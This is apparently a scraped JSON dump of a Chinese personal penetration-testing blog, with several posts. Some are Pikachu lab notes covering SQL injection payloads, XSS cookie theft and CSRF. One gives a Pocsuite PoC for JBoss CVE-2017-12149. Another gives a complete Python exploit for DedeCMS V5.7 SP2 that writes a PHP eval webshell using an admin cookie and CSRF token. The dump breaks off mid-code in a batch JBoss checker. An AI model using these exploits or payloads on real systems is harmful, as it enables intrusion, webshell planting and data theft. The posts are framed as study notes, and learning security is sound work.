1.本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。 2.远程文件包含漏洞：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。 因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。 你可以通过“File Inclusion”对应的测试栏目，来进一步的了解该漏洞。 本地文件包含看到在列表里面选择某个选项以后提交就会显示响应的界面，我们在url里面发现，界面是通过读取本地的php文件显示的。在url的传参内修改成系统的文件就可以读取。 远程文件包含前置条件：allow_url_fopen = on //默认打开allow_url_include = on //默认关闭 利用方式：搭建恶意站点，包含文件执行。 unsafe filedownload不安全的文件下载概述 文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。 此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。 所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！ 你可以通过“Unsafe file download”对应的测试栏目，来进一步的了解该漏洞。 文件下载：可以对传参修改下载敏感文件 unsafe upfileupload不安全的文件上传漏洞概述 文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。 所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如： –验证文件类型、后缀名、大小; –验证文件的上传方式; –对文件进行一定复杂的重命名; –不要暴露文件上传后的路径; –等等… 你可以通过“Unsafe file upload”对应的测试栏目，来进一步的了解该漏洞。 文件上传：上传一句话木马。有很多种绕过方式。其他的博客讲的比这里好，这里只是粗略的讲了几个绕过方式。https://www.cnblogs.com/ldhbetter/p/9190556.html over permission如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。 一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。 因此，在在权限管理中应该遵守： 1.使用最小权限原则对用户进行赋权; 2.使用合理（严格）的权限校验规则; 3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件; 你可以通过“Over permission”对应的测试栏目，来进一步的了解该漏洞。 水平越权平行越权：同级别权限操作。这里我这直接一个动图演示全部。这里是登录以后有查看个人资料的权限，通过修改url传参以后，可以查看同等级用户的资料。 垂直越权垂直越权：低级别对高级别操作。这是一个普通管理员用户，只有查看信息的权限。这是超级管理员用户，有添加用户权限。 查看数据包，这是超级管理员添加用户时发送的数据包。cookie是：qvat0froo8gp1go7kfoegcnse4 这里我们登陆了普通用户以后，用普通用户的cookie替换到超级管理员添加用户时的数据包，发现也能添加用户。 这就是垂直越权漏洞。 目录遍历目录遍历漏洞概述 在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。 看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。 需要区分一下的是,如果你通过不带参数的url（比如：http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。 而并不归为目录遍历漏洞。（关于敏感信息泄露你你可以在”i can see you ABC”中了解更多） 你可以通过“../../”对应的测试栏目，来进一步的了解该漏洞。 敏感信息泄露敏感信息泄露概述 由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如： —通过访问url下的目录，可以直接列出目录下的文件列表; —输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息; —前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等; 类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,甚至“离谱”的敏感信息泄露也会直接造成严重的损失。 因此,在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。 你可以通过“i can see your abc”对应的测试栏目，来进一步的了解该漏洞。 ——未完待续——","categories":[{"name":"渗透","slug":"渗透","permalink":"/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"靶场练习-2","slug":"靶场练习-2","date":"2019-03-08T16:00:00.000Z","updated":"2019-04-27T07:54:11.831Z","comments":true,"path":"2019/03/09/靶场练习-2/","link":"","permalink":"/2019/03/09/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-2/","excerpt":"在pikachu靶场练习一下，复习一下漏洞。","text":"在pikachu靶场练习一下，复习一下漏洞。 Sql Inject在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。一个严重的SQL注入漏洞，可能会直接导致一家公司破产！SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；2.使用参数化（Parameterized Query 或 Parameterized Statement）；3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重! 数字型注入（post）看一下界面使用效果。看到选中某些数字的时候，进行查询，显示对应的信息。初步判断是通过数字判断，对应取出数据库的内容显示出来。可以修改传入的参数，达到我们想要的查询。可以尝试 or 1=1，看能否达到一个数据遍历的效果。理解一下or 1=1在数据库中实现的效果。 12select username,email from member where id=1; ##这一句是查询表中 username，email字段通过id=1来进行查找select username,email from member where id=1 or 1=1; ##当后面加入一句or 1=1的时候，该句的意思就是select username,email from member。 id=1 or 1=1变成一个or判断 1真且为真，1=1为真，整句就为真，就只执行前面的select username,email from member 然后尝试在web端进行传参的修改。 这样就达到了一个数据遍历的效果 字符型注入看一下界面使用效果。这里是输入对应的字符以后会显示出相应的内容。 看一下数据库中根据字符串的查询语句。字符串的查询需要添加’’两个单引号。 1select id,email FROM member where username=&apos;kobe&apos;; 如果想要构造一个数据遍历的查询语句，应该是这样的： 1select id,email FROM member where username=&apos;kobe&apos; or 1=1; 看一下php中对于字符的传参是如何进行的， 123$name=$_GET[&apos;name&apos;]; //这里的变量是字符型，需要考虑闭合 $query=&quot;select id,email from member where username=&apos;$name&apos;&quot;; 这里是将输入的name的内容直接带进查询语句查询，内容在’’内，所以我们需要构造一个单引号’的闭合，所以我们键入的内容可以是 1kobe&apos; or 1=1# #用于对后面的单引号’注释。 这样键入的内容是kobe’ or 1=1#，带入查询后的操作语句就是 1$query=&quot;select id,email from member where username=&apos;kobe&apos; or 1=1#&apos;&quot;; 看一下效果 搜索型注入看一下界面使用效果。 这应该是数据库中的模糊查询。 1select * FROM member where username like &apos;%k%&apos;; 那我们同样是构造闭合再带入数据库操作语句去进行执行就可以了。 1select * FROM member where username like &apos;%k%&apos; or 1=1#%&apos;; 看一下在web端的操作效果 union联合查询联合查询的字段数需要和住查询一致。 1select id,email FROM member where username=&apos;kobe&apos; union select username,pw from member where id=1 在字符型注入中拼接上联合查询，可以查询其他字典内容。 将 1kobe&apos; union select username,pw from member where id=1# 在web端键入。可以查出id=1的username和pw 利用联合注入还可以做很多事，例如查询其他表的内容。例如查询user表的账号密码。给张图看一下其他的查询 可以使用order by排序判断字段数 基于函数的报错注入这里其实我不是很理解，可能是因为以前学数据库的时候没用过这些函数吧。不过看了视频做了点笔记，后面在好好琢磨一下。技巧思路： 在mysql中使用一些指定函数来制造报错，从而从报错信息中获取设定的信息。select/inset/update/delete都可以使用报错来获取信息。背景条件： 后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端。 附上一张报错注入的图： insert/update注入这里也是利用函数报错注入，还没弄得太懂，后面再做了。包括后面有个的一个delete注入，是抓包以后再包内进行函数报错注入。 http头注入对HTTP heade传过来的参数为进行过滤直接拼接进语句。同样是利用函数参数报错注入。看一下界面。 然后在HTTP heade传参部分构造一个函数注入报错。 1&apos; and updatexml(1,concat(0x7e,database()),0)# 将此代码拼接到cookie处。 基于boolian的盲注基于boolian的盲注的主要表现症状：0，没有报错信息1，不管正确的输入，还是错误的输入，都只显示两种情况（0或1）2，在正确的输入下，输入and 1=1 /and 1=2即可判断 通过真假的回显对比ASCII码来获取数据内容。 看下操作过程： ​此语句可以查询数据库第一个字符。 将字符转换成ascii码 接下来可以通过对比ascii码的大小做判断，大于100为真，大于113为假。 通过这个我们就可以在web端进行boolian注入。 1&apos; and ascii(substr(database(),1,1))&gt;113# 当然，我们可以先通过其他语句判断数据库名字长度。 ​ 基于时间的盲注这种用于没有回显的情况下的注入，利用时间判断，如果数据等于猜测的值，则执行sleep（5）看一下界面。不管我们尝试什么语句都只有一种回显。 但是我们发现它可以执行sleep（5）语句。 我们利用这个语句来进行基于时间的盲注。 1kobe&apos; and if((substr(database(),1,1))=&apos;p&apos;,sleep(5),null)# 当第一个字符等于’a’时，不执行sleep（5），当第一个字符等于’p’时，执行sleep（5）。 sql注入-OS远程控制通过sql注入写入恶意代码前提条件： 1，需要知道远程目录 2，需要远程目录有写权限 3，需要数据库开启了secure_file_priv ——未完待续——","categories":[{"name":"渗透","slug":"渗透","permalink":"/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"靶场练习-1","slug":"靶场练习-1","date":"2019-03-07T16:00:00.000Z","updated":"2019-11-11T07:29:03.802Z","comments":true,"path":"2019/03/08/靶场练习-1/","link":"","permalink":"/2019/03/08/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-1/","excerpt":"在pikachu靶场练习一下，复习一下漏洞。","text":"在pikachu靶场练习一下，复习一下漏洞。 暴力破解Burte Force（暴力破解）概述 “暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。 理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括： 1.是否要求用户设置复杂的密码； 2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp； 3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）； 4.是否采用了双因素认证； …等等。 基于表单的暴力破解看一下界面 输入账号密码，打开burp suite抓包。 输入的账号密码在这里。 发送。 选中第三个选项，然后把他选中的变量都清除掉，自己将账号密码变量add到爆破的内容中。 点击payload，一个个给变量选着爆破字典，给账号密码选中爆破的字典。我这里是手动写了几个字典进去。 爆破。 然后我们可以看到爆破后结果的长度有所不同。看一下回显。 长度为35076的是账号密码错误的。 长度为35052的是账号密码正确的。 验证码绕过(on client)验证是在客户端进行的都是客户可控的，都是不安全的。 看一下页面。查看一下页面源代码，看见验证是在前端通过一个JavaScript代码进行验证码的生成和验证的。抓一下包，发送到重放模块。把验证码直接删掉，重放查看一下回显。可以直接看到不需要输入验证码也直接进行了账号密码的查询判断。 所以爆破的时候可以直接忽视验证码，进行对账号密码的爆破就可以了，和上面的一样，就不再做一次了。 验证码绕过(on server)在后端进行验证码的判断。 看一下界面。发送到重放模块。看一下放数据包，提示密码错误。修改一下密码再发送一次。发现保持验证码不变，可以一直进行测试，验证码的时效很长。可以一直使用同一个验证码进行爆破。密码爆破成功。这里漏洞产生的原因是验证码的时效性的问题，没做到验证码一次一用，所以使得账号密码可以被爆破。 XSS（跨站脚本）Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型： 1.反射性XSS; 2.存储型XSS; 3.DOM型XSS; XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理: 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入; 输出转义：根据输出点的位置对输出到前端的内容进行适当转义; 反射型xss(get)看一下界面。输入的内容会被加到下面的一句话里面输出出来。 测试写上一个xss弹窗代码。 做了输入限制，看一下界面代码。 前端做了输入的长度限制，在前端做得限制都是不安全的，客户可以进行修改。 弹窗成功！ 是一个get的xss反射，我们可以通过输入盗取cookie的JavaScript代码，发送带有盗取cookie的链接给别人盗取别人的cookie。 盗取cookie可搭建xss平台，然后生成盗取代码将盗取到的cookie发送到平台上。 反射性xss(post)看一下界面。测试写上一个xss弹窗代码。是以post请求方式发送的。 这个漏洞的方法，别人教的我觉得有点鸡肋，是搭建一个web页面，页面的内容在访问这个页面的时候想这个漏洞页面发送一个post请求将cookie劫持到xss平台。 DOM型xssDOM是纯前端的操作，不涉及后台。在这个靶场下利用起来比较鸡肋。只有在第二个环境下有个类似get型xss的利用。就不想做了。然后自己看看网上的关于DOM型xss利用方式，看到了一个dvwa靶场的xss可以在DOM型xss哪里直接将cookie反弹到kali的nc下。这里就留个链接，后面再练习。https://blog.csdn.net/ski_12/article/details/60468362 xss盲打这里是一个设想的环境，前端输入的xss，在后台直接执行，自己不知道会不会成功。不做了。 xss之过滤过滤主要看黑盒测试的水平了，判断源码对什么进行了过滤再进行绕过。这个靶场就只是做了一个对script的过滤，只要通过大小写绕过就可以了。这个靶场只是让我们了解一下，更深的得自己去琢磨。 xss的键盘记录这里我没做，但是看了教程做了笔记。通过异步同步将键盘输入提交到自己搭建的xss的平台，要允许同源策略请求。 CSRFCSRF(跨站请求伪造)概述 Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。 在csrf的攻击场景中，攻击者会伪造一个请求，然后欺骗目标用户点击，用于一旦点击，整个攻击就完成了。 csrf是借用户的权限完成攻击，攻击者并没有拿到用户的权限。 CSRF(get)靶场的这个场景是在用在在登录状态下做信息修改，然后将修改的内容通过URL发送给其他用户，用户点击以后也就执行了该操作。下面图片演示一下： 这里进行修改电话信息，看到修改请求是通过get传输的 然后我们退出当前用户，登录lili该账户，然后再点击伪造过后的url。此处通过lili账户登录态点击url，执行修改电话操作，将电话号码修改成110。 CSRF(post)post请求的利用，搭建一个web网站，后端伪造一个post的请求包，让受害者在登录态下触发发送就可以实现csrf攻击。 CSRF（自己的总结）如何确认一个web系统存在csrf漏洞。1，对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以伪造。2，确认凭证的有效期 ——未完待续——","categories":[{"name":"渗透","slug":"渗透","permalink":"/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"Pocsuite的使用","slug":"Pocsuite的使用","date":"2018-10-23T04:00:00.000Z","updated":"2019-04-27T07:50:27.719Z","comments":true,"path":"2018/10/23/Pocsuite的使用/","link":"","permalink":"/2018/10/23/Pocsuite%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 PoC 的远程漏洞验证框架。Pocsuite 是知道创宇安全研究团队发展的基石，是团队发展至今持续维护的一个重要项目，保障了我们的 Web 安全研究能力的领先。","text":"Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 PoC 的远程漏洞验证框架。Pocsuite 是知道创宇安全研究团队发展的基石，是团队发展至今持续维护的一个重要项目，保障了我们的 Web 安全研究能力的领先。 Pocsuite的安装下载Pocsuite下载地址：链接：https://github.com/knownsec/pocsuite 操作系统 Ubuntu 下载后拖进去，直接进到目录就可以使用了，需要安装python2环境，当你写的poc使用到第三方包的时候需要自己安装 Pocsuite的使用这里有使用文档。https://www.seebug.org/help/dev Pocsuite poc编写文档里面写的很清楚，不过是因为我昨晚自己一下子没能理解，后来今天写出来了一个poc，就讲一下。 verify函数这个是验证poc的函数，其实写法很自由的，就是你理解漏洞原理以后用代码去验证，只是我昨晚一直不明白，我写了poc以后如何使得他返还success。先给你看我写的验证函数吧，其实就是前面jboss漏洞验证的原理。 1234567891011121314def _verify(self): result = &#123;&#125; # result是返回结果 # 验证代码 httpurl = self.url + '/invoker/readonly' NETWORK_STATUS = True r = requests.get(httpurl, timeout=1) # 加一个1s的时间限制，不然超时异常太久了 zt = r.status_code if zt == 500: vulurl = (httpurl) # if判断，当存在漏洞的时候将当前url+/invoker/readonly赋值给vulurl作为后面的result判断 if zt == 500: result['VerifyInfo'] = &#123;&#125; result['VerifyInfo']['URL'] = vulurl return self.parse_attack(result) 代码解释验证部分不解释，博客解释过了，主要是我在这里做了一个改动。当漏洞存在的时候（ps：也就是网页状态码是500的时候），我将(httpurl + ‘/invoker/readonly’)赋值给vulurl。为什么这样做呢。因为按照语法规则，result 的key值是有严格规定的，他最后只会返回以上内容。 12345678910111213141516171819202122232425262728293031323334353637383940414243result 每个 key 值相对应的意义： correspond：[ &#123; name: 'DBInfo', value：'数据库内容' &#125;, &#123; name: 'Username', value: '管理员用户名'&#125;, &#123; name: 'Password', value：'管理员密码' &#125;, &#123; name: 'Salt', value: '加密盐值'&#125;, &#123; name: 'Uid', value: '用户ID'&#125;, &#123; name: 'Groupid', value: '用户组ID'&#125;, &#123; name: 'ShellInfo', value: 'Webshell信息'&#125;, &#123; name: 'URL', value: 'Webshell地址'&#125;, &#123; name: 'Content', value: 'Webshell内容'&#125;, &#123; name: 'FileInfo', value: '文件信息'&#125;, &#123; name: 'Filename', value: '文件名称'&#125;, &#123; name: 'Content', value: '文件内容'&#125;, &#123; name: 'XSSInfo', value: '跨站脚本信息'&#125;, &#123; name: 'URL', value: '验证URL'&#125;, &#123; name: 'Payload', value: '验证Payload'&#125;, &#123; name: 'AdminInfo', value: '管理员信息'&#125;, &#123; name: 'Uid', value: '管理员ID'&#125;, &#123; name: 'Username', value: '管理员用户名'&#125;, &#123; name: 'Password', value: '管理员密码'&#125;, &#123; name: 'Database', value：'数据库信息' &#125;, &#123; name: 'Hostname', value: '数据库主机名'&#125;, &#123; name: 'Username', value：'数据库用户名' &#125;, &#123; name: 'Password', value: '数据库密码'&#125;, &#123; name: 'DBname', value: '数据库名'&#125;, &#123; name: 'VerifyInfo', value: '验证信息'&#125;, &#123; name: 'URL', value: '验证URL'&#125;, &#123; name: 'Postdata', value: '验证POST数据'&#125;, &#123; name: 'Path', value: '网站绝对路径'&#125;, &#123; name: 'SiteAttr', value: '网站服务器信息'&#125;, &#123; name: 'Process', value: '服务器进程'&#125; ] result就是返回你进行poc验证以后返回的信息，但是我返还的状态码500不在key值内，于是乎我在验证存在漏洞以后将vulurl赋值成验证后的url，只要返还的信息和VerifyInfo的url相等就会返还success。 使用方法1pocsuite -r jboss-_CVE-2017-12149.py -u www.baidu.com --verify 使用pocsuite对站点进行poc验证。你调用另一个函数_attack的时候就是攻击了。 1python pocsuite.py -r modules/qykcms_4_3_2_front_boolean_sqli.py -f qykcms.txt --threads 5 批量验证，指定某个txt文本内的url进行验证，调用5个线程。 附上源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python# coding: utf-8from pocsuite.net import reqfrom pocsuite.poc import POCBase, Outputfrom pocsuite.utils import registerimport requestsclass TestPOC(POCBase): vulID = '1' # VUL ID version = '1' # 默认为1 author = '9finger' # PoC 作者的大名 vulDate = '2018-10-20' # 漏洞公开的时间,不知道就写今天 createDate = '2018-10-20' # 编写 PoC 的日期 updateDate = '2018-10-20' # POC更新的时间,默认和编写时间一样 references = [ '#'] # 漏洞地址来源,0day 不用写 name = 'CVE-2017-12149' # PoC 名称 appPowerLink = '#' # 漏洞厂商主页地址 appName = 'JBoss5.x6.x 反序列化漏洞' # 漏洞应用名称 appVersion = '5.x6.x' # 漏洞影响版本 vulType = 'Java反序列化' # 漏洞类型,类型参考见 漏洞类型规范表 desc = ''' ### ''' # 漏洞简要描述 samples = [] # 测试样例,就是用 PoC 测试成功的网站，选填 def _attack(self): '''attack mode''' return self._verify() def _verify(self): result = &#123;&#125; # result是返回结果 # 验证代码 httpurl = self.url + '/invoker/readonly' NETWORK_STATUS = True r = requests.get(httpurl, timeout=1) # 加一个1s的时间限制，不然超时异常太久了 zt = r.status_code if zt == 500: vulurl = (httpurl) # if判断，当存在漏洞的时候将当前url+/invoker/readonly赋值给vulurl作为后面的result判断 if zt == 500: result['VerifyInfo'] = &#123;&#125; result['VerifyInfo']['URL'] = vulurl return self.parse_attack(result) def parse_attack(self, result): output = Output(self) if result: output.success(result) else: output.fail('Internet nothing returned') return outputregister(TestPOC)","categories":[{"name":"渗透","slug":"渗透","permalink":"/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"/tags/%E6%B8%97%E9%80%8F/"},{"name":"Python","slug":"Python","permalink":"/tags/Python/"}]},{"title":"DedeCMS V5.7 SP2 getshell exp 练手","slug":"DedeCMS V5.7 SP2 getshell exp 练手","date":"2018-10-12T04:00:00.000Z","updated":"2019-04-27T07:49:36.723Z","comments":true,"path":"2018/10/12/DedeCMS V5.7 SP2 getshell exp 练手/","link":"","permalink":"/2018/10/12/DedeCMS%20V5.7%20SP2%20getshell%20exp%20%E7%BB%83%E6%89%8B/","excerpt":"自己练手写了一个exp，说实话有点鸡肋，不过反正是练手嘛。","text":"自己练手写了一个exp，说实话有点鸡肋，不过反正是练手嘛。 DedeCMS V5.7 SP2后台代码执行漏洞拿webshell漏洞不是我审计出来的，只是他没写exp，我自己练手写了。参考网站：https://www.0dayhack.com/post-806.html 环境操作系统操作系统 Windows10 编译器pycharm Python版本Python3 代码分析这次函数都没定义，写得一点都不规范。 带上已经登入后的cookie再次请求1234host = 'http://127.0.0.1' # 织梦的网址cookie = \"menuitems=1_1%2C2_1%2C3_1; hd_sid=gkwZpM; DedeUserID=1; DedeUserID__ckMd5=21525998e2bf23ac; PHPSESSID=a8vetc0q9j1jr0glocmr9iaq47; DedeLoginTime=1539255891; DedeLoginTime__ckMd5=c98838290139737e; _csrf_name_13a77a19=cca919ac2d38b7a95be29c2215f26b09; _csrf_name_13a77a19__ckMd5=0cab530703fcb0ac\" # 输入cookieheaders = &#123;'Cookie': cookie&#125; # 在headers头添加cookiers = requests.get(host + '/dede/tpl.php?action=upload ', headers=headers) # 带上cookie请求后台上传网址 ![](/images/DedeCMS V5.7 SP2 getshell exp 练手/1.png)打开浏览器，登录后台以后，按f12开发人员工具，点击network，查看流量包，查看里面的cookie。cookie：Cookie，有时也用其复数形式 Cookies，指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）。定义于 RFC2109 和 2965 中的都已废弃，最新取代的规范是 RFC6265 [1] 。（可以叫做浏览器缓存） 获取token的值1234567soup = BeautifulSoup(rs.text, 'html.parser') # 获取网页源码width = soup.find(width=\"504\") # 查找width=\"504\"的内容width1 = str(width) # 将获取到的内容进行类型强转rex = r\"(?&lt;=input name=\\\"token\\\" type=\\\"hidden\\\" value=\\\").*(?=\\\")\" # 利用re模块匹配token的值result = re.finditer(rex, width1, flags=re.M)for match in result: token = match.group() 这个其实是用前面博客学到的东西来写的，用BeautifulSoup模块和re模块进行内容的获取。附上运行的图理解一下：![](/images/DedeCMS V5.7 SP2 getshell exp 练手/2.png)![](/images/DedeCMS V5.7 SP2 getshell exp 练手/3.png) getshell1234567891011 # 带上cookie和token的值写shellrs = requests.get( host + '/dede/tpl.php?filename=9finger.lib.php&amp;action=savetagfile&amp;content=%3C?php%20eval($_POST[\\'pass\\'])?%3E&amp;token=' + token, headers=headers)# 查看是否写入shellzt = requests.get(host + '/include/taglib/9finger.lib.php')ok = zt.status_codeif ok == 200: print ('shell的路径是' + host + '/include/taglib/9finger.lib.php')else: print ('失败了') 这个也是前面学习到的内容写的，不解释了。![](/images/DedeCMS V5.7 SP2 getshell exp 练手/4.png)![](/images/DedeCMS V5.7 SP2 getshell exp 练手/5.png) 后话其实一开始觉得这个博客有点鸡肋，但是后来在写的过程中发现好像有一套完整的方法可以getshell，现在我写的代码的前置条件是，1：知道后台 2：得到了管理员的账号密码。但是后来我在写代码的过程看了别的博客，找到了另一个漏洞可以满足一个前置条件。第一个：https://www.0dayhack.com/post-801.html这个我已经验证过，可以通过漏洞查找到网站后台。![](/images/DedeCMS V5.7 SP2 getshell exp 练手/6.png)第二个：这个还没验证，是任意用户可以通过漏洞更改前台会员密码。https://www.0dayhack.com/post-768.html因为更改不是管理员账号密码，所以懒得去验证了。所以现在还是有那么一个问题没解决，没有办法去获取管理员账号密码。这里顺便把源码发一下吧。现在织梦官网最新的还是这套源码，不过以后应该是会更新修复的。链接：https://pan.baidu.com/s/1TGzuRGEmSlTGS050CPBK9A提取码：vkzl 附上完整源码： 12345678910111213141516171819202122232425262728# coding=utf-8from bs4 import BeautifulSoupimport requestsimport rehost = 'http://127.0.0.1' # 织梦的网址cookie = \"menuitems=1_1%2C2_1%2C3_1; hd_sid=gkwZpM; DedeUserID=1; DedeUserID__ckMd5=21525998e2bf23ac; PHPSESSID=a8vetc0q9j1jr0glocmr9iaq47; DedeLoginTime=1539255891; DedeLoginTime__ckMd5=c98838290139737e; _csrf_name_13a77a19=cca919ac2d38b7a95be29c2215f26b09; _csrf_name_13a77a19__ckMd5=0cab530703fcb0ac\" # 输入cookieheaders = &#123;'Cookie': cookie&#125; # 在headers头添加cookiers = requests.get(host + '/dede/tpl.php?action=upload ', headers=headers) # 带上cookie请求后台上传网址soup = BeautifulSoup(rs.text, 'html.parser') # 获取网页源码width = soup.find(width=\"504\") # 查找width=\"504\"的内容width1 = str(width) # 将获取到的内容进行类型强转rex = r\"(?&lt;=input name=\\\"token\\\" type=\\\"hidden\\\" value=\\\").*(?=\\\")\" # 利用re模块匹配token的值result = re.finditer(rex, width1, flags=re.M)for match in result: token = match.group() # 带上cookie和token的值写shellrs = requests.get( host + '/dede/tpl.php?filename=9finger.lib.php&amp;action=savetagfile&amp;content=%3C?php%20eval($_POST[\\'pass\\'])?%3E&amp;token=' + token, headers=headers)# 查看是否写入shellzt = requests.get(host + '/include/taglib/9finger.lib.php')ok = zt.status_codeif ok == 200: print ('shell的路径是' + host + '/include/taglib/9finger.lib.php')else: print ('失败了')","categories":[{"name":"Python","slug":"Python","permalink":"/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"},{"name":"EXP练手","slug":"EXP练手","permalink":"/tags/EXP%E7%BB%83%E6%89%8B/"}]},{"title":"批量验证jboss","slug":"批量验证jboss","date":"2018-10-07T16:00:00.000Z","updated":"2019-04-27T07:55:52.754Z","comments":true,"path":"2018/10/08/批量验证jboss/","link":"","permalink":"/2018/10/08/%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81jboss/","excerpt":"根据师兄们的思路和代码自己小改的代码。","text":"根据师兄们的思路和代码自己小改的代码。 jboss反序列化漏洞该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。复现可以参考博客：https://www.cnblogs.com/Hi-blog/p/7904443.html 环境操作系统操作系统 Windows10 编译器pycharm Python版本Python3 代码分析两个函数吧，有些还是从网上抄来用的，还不是很理解。 批量在网址后面添加路径1234567891011def tianjia(): file = open(\"D:/python源码/shodan爬虫.txt\", \"r\", newline='\\r\\n') # 打开爬虫文本 newfile = open(\"D:/python源码/shodan爬虫添加.txt\", 'w', ) # 